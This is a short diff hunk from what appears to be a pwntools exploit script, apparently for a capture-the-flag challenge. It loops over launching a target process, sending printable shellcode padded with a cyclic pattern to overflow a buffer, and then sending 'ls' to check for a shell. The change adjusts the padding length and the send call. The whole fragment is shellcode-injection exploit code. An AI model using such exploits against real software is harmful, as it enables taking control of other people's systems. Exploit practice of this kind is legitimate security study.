@@ -43,7 +43,7 @@ while True:
     r = exe.process()
     count += 1
     time.sleep(0.001)
-    r.send(printable_shellcode + cyclic(0xA8 - len(printable_shellcode)) + b'\x04')
+    r.sendline(printable_shellcode + cyclic(0xA7 - len(printable_shellcode)))
     r.recvuntil(b'Input text : triggering bug...\n')
     try:
         r.sendline(b'ls')
